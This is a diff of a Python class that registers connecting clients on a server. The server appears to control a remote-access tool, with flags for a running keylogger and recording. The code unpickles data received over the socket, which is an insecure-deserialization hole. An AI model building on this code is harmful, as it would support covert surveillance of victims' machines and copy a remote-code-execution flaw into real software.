@@ -1,30 +1,42 @@
 from dataclasses import dataclass, field
+from collections import defaultdict
 
-import pickle, hashlib
+import pickle, hashlib, os, json
 
 from .handler import ClientWrapper
 from .bucket import ConnectionBucket
 
 @dataclass
-class ClientDevice:
-    hostname: str
-    publib_address: str
-    local_address: str
+class _clientCacheClass:
+    runningKeylogger: bool = False
 
-    clientUniqueID: str
-    additionalData: dict = field(default_factory = dict)
-    stillRecording: bool = False
+class ClientDevice(_clientCacheClass):
+    def __init__(self, client_data: bytes, socketInstance: ClientWrapper, connectionBucket: ConnectionBucket) -> None:
 
-    def load_data(self, client_data: bytes, socketInstance: ClientWrapper, connectionBucket: ConnectionBucket) -> bool:
-        self.hostname, self.publib_address, self.local_address = pickle.loads(client_data)
-        clientUniqueID: str = hashlib.sha256(str(self.hostname + self.publib_address + self.local_address).encode('UTF-8')).hexdigest()
+        _hostname, _publib_address, _local_address = pickle.loads(client_data)
+        clientUniqueID: str = hashlib.sha256(str(_hostname + _publib_address + _local_address).encode('UTF-8')).hexdigest()
 
         if (clientUniqueID not in [client.clientUniqueID for client in connectionBucket.connectionList]):
+
+            if (os.path.exists(cacheName := f'clients/cache/{clientUniqueID}.json')):
+                self.clientCacheData = json.loads(open(cacheName, 'r').read())
+                self.__dict__ = self.clientCacheData
+
+            else:
+                json.dump(_clientCacheClass().__dict__, open(cacheName, 'w'), indent = 2)
+                super().__init__()
+
             connectionBucket.connectionList.append(self)
-            socketInstance.send_packet('0') # Indicates the client is eligable to join the server
+            socketInstance.send_packet('0')
+
+            self._joined = True
 
             self.socket: ClientWrapper = socketInstance
             self.clientUniqueID = clientUniqueID
-            return True
 
-        return False
+            self.hostname: str = _hostname
+            self.publib_address: str = _publib_address
+            self.local_address: str = _local_address
+
+            self.additionalData: dict = dict()
+            self.stillRecording: bool = False
